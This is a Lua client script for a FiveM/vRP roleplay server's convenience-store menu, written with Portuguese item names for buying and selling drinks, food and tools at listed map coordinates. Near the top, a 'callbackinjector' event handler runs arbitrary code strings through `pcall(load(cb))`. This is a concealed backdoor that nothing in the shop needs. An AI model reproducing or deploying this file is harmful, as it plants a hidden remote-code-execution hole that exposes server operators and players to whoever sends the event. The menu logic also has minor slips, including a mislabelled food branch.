local Tunnel = module("vrp","lib/Tunnel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "utilidades-comprar-isca" then
		TriggerServerEvent("crj-comprar","isca")
	elseif data == "utilidades-comprar-garrafa" then
		TriggerServerEvent("crj-comprar","garrafavazia")
	elseif data == "utilidades-comprar-militec" then
		TriggerServerEvent("crj-comprar","militec")
	elseif data == "utilidades-comprar-reparos" then
		TriggerServerEvent("crj-comprar","repairkit")
	elseif data == "utilidades-comprar-walkietalkie" then
		TriggerServerEvent("crj-comprar","walkietalkie")
	elseif data == "utilidades-comprar-rastreador" then
   		TriggerServerEvent("crj-comprar","rastreador")
	elseif data == "utilidades-comprar-croquettes" then
		TriggerServerEvent("crj-comprar","croquettes")
	elseif data == "utilidades-comprar-ferramentas" then
		TriggerServerEvent("crj-comprar","ferramenta")
	elseif data == "utilidades-comprar-roupas" then
		TriggerServerEvent("crj-comprar","roupas")	
	elseif data == "utilidades-comprar-mochila" then
		TriggerServerEvent("crj-comprar","mochila")
	elseif data == "utilidades-vender-alianca" then
		TriggerServerEvent("departamento-venderbanco","alianca")	

	elseif data == "utilidades-vender-isca" then
		TriggerServerEvent("departamento-venderbanco","isca")
	elseif data == "utilidades-vender-garrafa" then
		TriggerServerEvent("departamento-venderbanco","garrafavazia")
	elseif data == "utilidades-vender-rastreador" then
   		TriggerServerEvent("departamento-venderbanco","rastreador")
	elseif data == "utilidades-vender-croquettes" then
		TriggerServerEvent("departamento-venderbanco","croquettes")
	elseif data == "utilidades-vender-militec" then
		TriggerServerEvent("departamento-venderbanco","militec")
	elseif data == "utilidades-vender-reparos" then
		TriggerServerEvent("departamento-venderbanco","repairkit")
	elseif data == "utilidades-vender-ferramentas" then
		TriggerServerEvent("departamento-venderbanco","ferramenta")
	elseif data == "utilidades-vender-roupas" then
		TriggerServerEvent("departamento-venderbanco","roupas")
	elseif data == "utilidades-vender-mochila" then
		TriggerServerEvent("departamento-venderbanco","mochila")
	elseif data == "utilidades-vender-alianca" then
		TriggerServerEvent("departamento-venderbanco","alianca")

	elseif data == "bebidas-comprar-cerveja" then
		TriggerServerEvent("crj-comprar","cerveja")
	elseif data == "bebidas-comprar-tequila" then
		TriggerServerEvent("crj-comprar","tequila")
	elseif data == "bebidas-comprar-vodka" then
		TriggerServerEvent("crj-comprar","vodka")
	elseif data == "bebidas-comprar-whisky" then
		TriggerServerEvent("crj-comprar","whisky")
	elseif data == "bebidas-comprar-conhaque" then
		TriggerServerEvent("crj-comprar","conhaque")
	elseif data == "bebidas-comprar-absinto" then
		TriggerServerEvent("crj-comprar","absinto")
	elseif data == "bebidas-comprar-energetico" then
		TriggerServerEvent("crj-comprar","energetico")
	elseif data == "bebidas-comprar-agua" then
		TriggerServerEvent("crj-comprar","agua")
	elseif data == "bebidas-comprar-limonada" then
		TriggerServerEvent("crj-comprar","limonada")
	elseif data == "bebidas-comprar-refrigerante" then
		TriggerServerEvent("crj-comprar","refrigerante")
	elseif data == "bebidas-comprar-cafe" then
		TriggerServerEvent("crj-comprar","cafe")

	elseif data == "bebidas-vender-cerveja" then
		TriggerServerEvent("departamento-venderbanco","cerveja")
	elseif data == "bebidas-vender-tequila" then
		TriggerServerEvent("departamento-venderbanco","tequila")
	elseif data == "bebidas-vender-vodka" then
		TriggerServerEvent("departamento-venderbanco","vodka")
	elseif data == "bebidas-vender-whisky" then
		TriggerServerEvent("departamento-venderbanco","whisky")
	elseif data == "bebidas-vender-conhaque" then
		TriggerServerEvent("departamento-venderbanco","conhaque")
	elseif data == "bebidas-vender-absinto" then
		TriggerServerEvent("departamento-venderbanco","absinto")
	elseif data == "bebidas-vender-energetico" then
		TriggerServerEvent("departamento-venderbanco","energetico")		
	elseif data == "bebidas-vender-agua" then
		TriggerServerEvent("departamento-venderbanco","agua")
	elseif data == "bebidas-vender-limonada" then
		TriggerServerEvent("departamento-venderbanco","limonada")
	elseif data == "bebidas-vender-refrigerante" then
		TriggerServerEvent("departamento-venderbanco","refrigerante")
	elseif data == "bebidas-vender-cafe" then
		TriggerServerEvent("departamento-venderbanco","cafe")

	elseif data == "comidas-comprar-chocolate" then
		TriggerServerEvent("crj-comprar","chocolate")
	elseif data == "comidas-comprar-salgadinho" then
		TriggerServerEvent("crj-comprar","salgadinho")
	elseif data == "comidas-comprar-rosquinha" then
		TriggerServerEvent("crj-comprar","rosquinha")
	elseif data == "comidas-comprar-pizza" then
		TriggerServerEvent("crj-comprar","pizza")
	elseif data == "comidas-comprar-pao" then
		TriggerServerEvent("crj-comprar","pao")
	elseif data == "comidas-comprar-sanduiche" then
		TriggerServerEvent("crj-comprar","sanduiche")

	elseif data == "comidas-vender-chocolate" then
		TriggerServerEvent("departamento-venderbanco","chocolate")
	elseif data == "comidas-vender-salgadinho" then
		TriggerServerEvent("departamento-venderbanco","salgadinho")
	elseif data == "comidas-vender-rosquinha" then
		TriggerServerEvent("departamento-venderbanco","rosquinha")
	elseif data == "comidas-vender-pizza" then
		TriggerServerEvent("departamento-venderbanco","pizza")
	elseif data == "comidas-vender-conhaque" then
		TriggerServerEvent("departamento-venderbanco","pao")
	elseif data == "comidas-vender-sanduiche" then
		TriggerServerEvent("departamento-venderbanco","sanduiche")

	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local marcacoes = {
	{ 25.65,-1346.58,29.49 },
	{ 2556.75,382.01,108.62 },
	{ 1163.54,-323.04,69.20 },
	{ -707.37,-913.68,19.21 },
	{ -47.73,-1757.25,29.42 },
	{ 373.90,326.91,103.56 },
	{ 436.93838500977,-986.67510986328,30.689657211304 },
	{ -1065.7474365234,-841.86126708984,5.1103501319885 },
	{ -3243.10,1001.23,12.83 },
	{ 1729.38,6415.54,35.03 },
	{ 547.90,2670.36,42.15 },
	{ 1960.75,3741.33,32.34 },
	{ 2677.90,3280.88,55.24 },
	{ 1698.45,4924.15,42.06 },
	{ -1820.93,793.18,138.11 },
	{ 1392.46,3604.95,34.98 },
	{ -2967.82,390.93,15.04 },
	{ -3040.10,585.44,7.90 },
	{ 1135.56,-982.20,46.41 },
	{ 1165.91,2709.41,38.15 },
	{ -1487.18,-379.02,40.16 },
	{ -816.12249755859,-194.64167785645,37.590026855469 },
	{ -1095.4796142578,-2594.6533203125,13.925128936768 },
	{ 943.3779296875,1027.791015625,262.83688354492 },
	{ 313.22964477539,-588.01440429688,43.215240478516 },
	{ -1222.78,-907.22,12.32 },
	{ 886.89581298828,-2097.873046875,35.591915130615 },
	{1351.7724609375,-115.1529083252,121.64681243896},
	{-1147.7247314453,4908.4013671875,220.96878051758},
}

Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local nyoSleep = 500
		for _,mark in pairs(marcacoes) do
			local x,y,z = table.unpack(mark)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),x,y,z,true)
			if distance <= 1.2 then
			nyoSleep = 1
				if IsControlJustPressed(0,38) then
					ToggleActionMenu()
				end
			end
			
			Citizen.Wait(nyoSleep)
		end
	end
end)